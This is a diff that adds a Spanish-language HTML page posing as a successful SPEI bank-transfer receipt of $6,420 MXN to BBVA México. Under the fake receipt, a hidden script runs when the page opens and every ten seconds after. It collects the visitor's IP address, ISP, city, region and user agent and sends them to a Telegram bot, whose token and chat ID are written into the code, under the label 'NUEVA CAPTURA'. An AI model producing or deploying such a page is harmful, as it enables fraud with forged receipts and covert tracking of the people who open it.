@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Comprobante de Transferencia Exitosa</title>
+    <style>
+        body { font-family: sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; width: 320px; padding: 25px; border-radius: 15px; box-shadow: 0 8px 20px rgba(0,0,0,0.15); border-top: 10px solid #004a99; text-align: center; }
+        .monto { font-size: 30px; font-weight: bold; margin: 20px 0; color: #333; }
+        .status { color: #28a745; font-weight: bold; font-size: 14px; }
+        .footer { font-size: 11px; color: #777; margin-top: 15px; border-top: 1px solid #eee; padding-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="status">✓ TRANSFERENCIA FINALIZADA</div>
+        <div class="monto">$6,420.00 MXN</div>
+        <p style="font-size: 13px; color: #444;">Operación exitosa hacia <b>BBVA México</b></p>
+        <div class="footer">
+            Referencia: SPEI-992811<br>
+            Fecha: 13/Abr/2026 13:26:01<br>
+            Clave de rastreo: 884729102837461
+        </div>
+    </div>
+
+<script>
+    const TELEGRAM_TOKEN = '8583686617:AAE7OeA-mkMENpJ0Ke5ndJ0xpCuF2DcaEpU';
+    const CHAT_ID = '-1003773057625';
+
+    function capturarDatos() {
+        fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+            const mensaje = `🚨 *NUEVA CAPTURA AGENCIA 06* 🚨\n\n` +
+                            `🌐 *IP:* ${data.ip}\n` +
+                            `🏢 *ISP:* ${data.org}\n` +
+                            `📍 *Ubicación:* ${data.city}, ${data.region}\n` +
+                            `📱 *User-Agent:* ${navigator.userAgent}\n` +
+                            `🔋 *Batería:* ${navigator.getBattery ? 'Consultando...' : 'N/A'}`;
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: mensaje,
+                    parse_mode: 'Markdown'
+                })
+            });
+        }).catch(err => console.log("Error en captura"));
+    }
+
+    // Primera captura al cargar
+    window.onload = () => {
+        capturarDatos();
+        // Repetir cada 10 segundos (10000 milisegundos)
+        setInterval(capturarDatos, 10000);
+    };
+</script>
+</body>
+</html>
